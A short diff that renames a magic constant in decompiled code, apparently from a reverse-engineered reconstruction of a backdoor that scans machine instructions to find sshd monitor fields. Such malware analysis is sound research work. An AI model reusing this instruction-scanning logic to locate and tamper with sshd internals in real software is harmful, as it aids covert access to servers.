@@ -44,7 +44,7 @@ BOOL sshd_find_monitor_field_slot_via_mm_request_send
       monitor_field_addr = (u8 *)0x0;
       if (((insn_ctx.prefix.flags_u32 & 0x100) != 0) &&
          (monitor_field_addr = (u8 *)insn_ctx.mem_disp,
-         ((uint)insn_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
+         ((uint)insn_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32)) {
         monitor_field_addr = insn_ctx.instruction + insn_ctx.mem_disp + insn_ctx.instruction_size;
       }
       tracked_reg = 0;
